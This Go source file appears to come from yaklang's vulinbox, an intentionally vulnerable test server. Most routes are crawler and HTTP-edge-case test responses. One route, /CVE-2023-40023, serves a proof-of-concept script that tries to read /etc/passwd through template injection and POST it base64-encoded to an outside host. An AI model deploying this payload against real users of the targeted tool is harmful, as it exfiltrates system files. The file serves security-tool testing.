package vulinbox

import (
	"bytes"
	"net/http"
	"strconv"
	"strings"
	"time"

	"github.com/yaklang/yaklang/common/log"
	"github.com/yaklang/yaklang/common/utils"
	"github.com/yaklang/yaklang/common/yak/yaklib/codec"
)

func (s *VulinServer) registerMiscRoute() {
	router := s.router

	handle := func(writer http.ResponseWriter, request *http.Request) {
		writer.Header().Set("Content-Type", "text/html; charset=utf-8")
		writer.Write([]byte(`<script>
  const xhr = new XMLHttpRequest();
  xhr.open("POST", "http://yakit.com/filesubmit");
  xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
  xhr.send("file={{base64enc(file(/etc/passwd))}}");
</script>`))
	}
	r := router.PathPrefix("/cve").Name("yakit cve poc 环境").Subrouter()
	addRouteWithVulInfo(r, &VulInfo{
		Path:    `/CVE-2023-40023`,
		Title:   "CVE-2023-40023",
		Handler: handle,
	})
	s.router.HandleFunc("/CVE-2023-40023", handle)
	s.registerMiscResponse()
}

func (s *VulinServer) registerMiscResponse() {
	router := s.router

	r := router.PathPrefix("/misc/response").Name("一些精心构造的畸形/异常/测试响应").Subrouter()
	addRouteWithVulInfo(r, &VulInfo{
		Handler: expect100handle, Title: "100-Continue", Path: "/expect100",
	})
	addRouteWithVulInfo(r, &VulInfo{
		Handler: func(writer http.ResponseWriter, request *http.Request) {
			writer.Header().Set("Content-Type", "text/plain; charset=utf-8")
			start := time.Now()
			for {
				writer.Write([]byte("Hello Long-Time Chunked now is " + time.Now().Format("2006-01-02 15:04:05") + "\n"))
				utils.FlushWriter(writer)
				time.Sleep(time.Second * 1)
				if time.Since(start) > time.Second*60 {
					break
				}
			}
		},
		Title: "Long-Time Chunked 测试",
		Path:  "/long-time-chunked",
	})
	addRouteWithVulInfo(r, &VulInfo{
		Handler: func(writer http.ResponseWriter, request *http.Request) {
			writer.Header().Set("Content-Type", "text/html; charset=utf-8")
			writer.Header().Set("X-Info", `This is a test for too large body(50MB) chunked, if u see this but no body, it's save`)
			writer.Write([]byte(strings.Repeat("a", 1024*1024*50))) // 50MB
		},
		Title: "TooLarge Body Chunked 测试",
		Path:  "/too-large-body-chunked",
	})
	addRouteWithVulInfo(r, &VulInfo{
		Handler: func(writer http.ResponseWriter, request *http.Request) {
			redirectTimes := codec.Atoi(request.URL.Query().Get("times"))
			if redirectTimes > 0 {
				http.Redirect(writer, request, "/misc/response/redirect?times="+strconv.Itoa(redirectTimes-1), http.StatusFound)
			} else {
				writer.WriteHeader(http.StatusOK)
				writer.Write([]byte("finished"))
			}
		},
		Title:        "redirect-test",
		DefaultQuery: "times=5",
		Path:         "/redirect",
	})
	addRouteWithVulInfo(r, &VulInfo{
		Handler: func(writer http.ResponseWriter, request *http.Request) {
			defer func() {
				if err := recover(); err != nil {
					log.Error(err)
				}
			}()
			ret := codec.Atoi(request.URL.Query().Get("cl"))
			writer.Write(bytes.Repeat([]byte{'a'}, ret))
		},
		Path:         "/content_length",
		DefaultQuery: "cl=1024",
		Title:        "通过(cl=int)定义响应体长度",
	})

	addRouteWithVulInfo(r, &VulInfo{
		Handler: func(writer http.ResponseWriter, request *http.Request) {
			writer.Header().Set("Content-Type", "text/html; charset=utf-8")
			writer.Write([]byte(`<body>
	
<a href="#">this is a ssa ir js test spa</a>

<div id='app'></div>	

<script>
!function(c){function e(e){for(var t,r,n=e[0],o=e[1],u=e[2],a=0,i=[];a<n.length;a++)r=n[a],Object.prototype.hasOwnProperty.call(p,r)&&p[r]&&i.push(p[r][0]),p[r]=0;for(t in o)Object.prototype.hasOwnProperty.call(o,t)&&(c[t]=o[t]);for(d&&d(e);i.length;)i.shift()();return f.push.apply(f,u||[]),l()}function l(){for(var e,t=0;t<f.length;t++){for(var r=f[t],n=!0,o=1;o<r.length;o++){var u=r[o];0!==p[u]&&(n=!1)}n&&(f.splice(t--,1),e=s(s.s=r[0]))}return e}var r={},p={1:0},f=[];function s(e){if(r[e])return r[e].exports;var t=r[e]={i:e,l:!1,exports:{}};return c[e].call(t.exports,t,t.exports,s),t.l=!0,t.exports}s.e=function(o){var e=[],r=p[o];if(0!==r)if(r)e.push(r[2]);else{var t=new Promise(function(e,t){r=p[o]=[e,t]});e.push(r[2]=t);var n,u=document.createElement("script");u.charset="utf-8",u.timeout=120,s.nc&&u.setAttribute("nonce",s.nc),u.src=s.p+"static/js/"+({}[o]||o)+"."+{3:"51247ecb",4:"65676c3f"}[o]+".chunk.js";var a=new Error;n=function(e){u.onerror=u.onload=null,clearTimeout(i);var t=p[o];if(0!==t){if(t){var r=e&&("load"===e.type?"missing":e.type),n=e&&e.target&&e.target.src;a.message="Loading chunk "+o+" failed.\n("+r+": "+n+")",a.name="ChunkLoadError",a.type=r,a.request=n,t[1](a)}p[o]=void 0}};var i=setTimeout(function(){n({type:"timeout",target:u})},12e4);u.onerror=u.onload=n,document.head.appendChild(u)}return Promise.all(e)},s.m=c,s.c=r,s.d=function(e,t,r){s.o(e,t)||Object.defineProperty(e,t,{enumerable:!0,get:r})},s.r=function(e){"undefined"!=typeof Symbol&&Symbol.toStringTag&&Object.defineProperty(e,Symbol.toStringTag,{value:"Module"}),Object.defineProperty(e,"__esModule",{value:!0})},s.t=function(t,e){if(1&e&&(t=s(t)),8&e)return t;if(4&e&&"object"==typeof t&&t&&t.__esModule)return t;var r=Object.create(null);if(s.r(r),Object.defineProperty(r,"default",{enumerable:!0,value:t}),2&e&&"string"!=typeof t)for(var n in t)s.d(r,n,function(e){return t[e]}.bind(null,n));return r},s.n=function(e){var t=e&&e.__esModule?function(){return e.default}:function(){return e};return s.d(t,"a",t),t},s.o=function(e,t){return Object.prototype.hasOwnProperty.call(e,t)},s.p="/",s.oe=function(e){throw console.error(e),e};var t=this["webpackJsonppalm-kit-desktop"]=this["webpackJsonppalm-kit-desktop"]||[],n=t.push.bind(t);t.push=e,t=t.slice();for(var o=0;o<t.length;o++)e(t[o]);var d=n;l()}([])
</script>
<script src='/static/js/spa/pre-main.js'></script>
<script src='/static/js/spa/main.js'></script>
</body>
`))
		},
		Path:  "/webpack-ssa-ir-test.html",
		Title: "测试普通爬虫的 Webpack 处理能力",
	})

	addRouteWithVulInfo(r, &VulInfo{
		Handler: func(writer http.ResponseWriter, request *http.Request) {
			writer.Write([]byte(`Hello Fetch Request is Fetched`))
		},
		Path: "/fetch/basic.action",
	})

	crawlerRoutes := []*VulInfo{
		{
			Path: "/javascript-ssa-ir-basic/1.js",
			Handler: func(writer http.ResponseWriter, request *http.Request) {
				writer.Header().Set("Content-Type", "application/javascript")
				writer.Write([]byte(`console.log('1.js'); var deepUrl = 'deep.js';`))
			},
		},
		{
			Path: "/javascript-ssa-ir-basic/2.js",
			Handler: func(writer http.ResponseWriter, request *http.Request) {
				writer.Header().Set("Content-Type", "application/javascript")
				writer.Write([]byte(`console.log('2.js'); fetch(deepUrl, {
	method: 'POST',
	headers: { 'HackedJS': "AAA"},
})`))
			},
		},
		{
			Path: "/javascript-ssa-ir-basic/deep.js",
			Handler: func(writer http.ResponseWriter, request *http.Request) {
				if request.Method == "POST" {
					if request.Header.Get(`HackedJS`) == "AAA" {
						writer.Write([]byte("SUCCESS IN DEEP!"))
						return
					}
				}
				writer.Write([]byte("BAD IN DEEP!"))
			},
		},
		{
			Path: "/javascript-ssa-ir-basic/3.js",
			Handler: func(writer http.ResponseWriter, request *http.Request) {
				writer.Header().Set("Content-Type", "application/javascript")
				writer.Write([]byte(`// 创建一个新的 XMLHttpRequest 对象
var xhr = new XMLHttpRequest();

// 配置请求类型为 POST，以及目标 URL
xhr.open('POST', 'deep.js', true);

// 设置所需的 HTTP 请求头
xhr.setRequestHeader('HackedJS', 'AAA');

// 设置请求完成后的回调函数
xhr.onreadystatechange = function() {
  // 检查请求是否完成
  if (xhr.readyState === XMLHttpRequest.DONE) {
    // 检查请求是否成功
    if (xhr.status === 200) {
      // 请求成功，处理响应数据
      console.log(xhr.responseText);
    } else {
      // 请求失败，打印状态码
      console.error('Request failed with status:', xhr.status);
    }
  }
};

// 发送请求，可以在此处发送任何需要的数据
xhr.send();`))
			},
		},
	}
	for _, route := range crawlerRoutes {
		addRouteWithVulInfo(r, route)
	}
	addRouteWithVulInfo(r, &VulInfo{
		Path: "/javascript-ssa-ir-basic/basic-fetch.html",
		Handler: func(writer http.ResponseWriter, request *http.Request) {
			writer.Header().Set("Content-Type", "text/html; charset=utf-8")
			writer.Write([]byte(`<body>
	
<a href="#">this is a ssa ir js test spa</a>

<script src='1.js'></script>
<script src='2.js'></script>
<div id='app'></div>

<script>

fetch('/misc/response/fetch/basic.action')
  .then(response => {
    if (!response.ok) {
      throw new Error('Network response was not ok ' + response.statusText);
    }
    return response.text();
  })
  .then(data => {
    console.log(data); // 这里是你的页面内容
  })
  .catch(error => {
    console.error('There has been a problem with your fetch operation:', error);
  });


</script>
<script src='4.js' defer></script>
<script src='3.js' defer></script>
</body>
`))
		},
		Title: "测试普通爬虫的基础JS处理能力",
	})
}
